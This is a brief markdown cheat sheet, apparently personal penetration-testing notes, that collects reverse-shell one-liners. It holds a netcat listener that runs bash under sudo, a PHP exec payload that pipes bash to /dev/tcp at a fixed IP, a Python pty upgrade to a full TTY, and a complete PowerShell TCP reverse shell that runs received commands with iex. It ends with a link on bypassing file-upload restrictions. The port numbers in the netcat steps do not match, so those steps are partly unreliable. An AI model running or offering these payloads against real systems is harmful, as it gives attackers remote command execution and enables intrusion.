# Reverse Shells

## Linux
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

- ### netcat

  1. Start listener on attacker machine
      
	  - cache sudo credentials and start listener in background:

		    sudo echo test
			sudo nc -l -p 4444 -e /bin/bash &
  
      - verify listener is running:

		    netstat -vat -p 2323 
  
  2. Connect to listener from target machine
	         
	     nc <target_address> 2323
		
- ### PHP
	
	  <?php exec("/bin/bash -c '/bin/bash -i > /dev/tcp/192.168.49.134/9999 0>&1 2>&1'"); ?>
	 - Note: 2>&1 gives error messages

- ### Get full TTY shell
	
  1. Spawn bash shell
	
	     python3 -c 'import pty; pty.spawn("/bin/bash")'
	
  2. Get full TTY shell 
		
		 ctrl-z
		 stty raw -echo
		 fg
		 enter
		 enter
		 export TERM=screen

## Windows
https://book.hacktricks.xyz/shells/shells/windows
	
- Powershell
		
	  powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
		
## Bypassing File Upload Restrictions
https://null-byte.wonderhowto.com/how-to/bypass-file-upload-restrictions-web-apps-get-shell-0323454/
	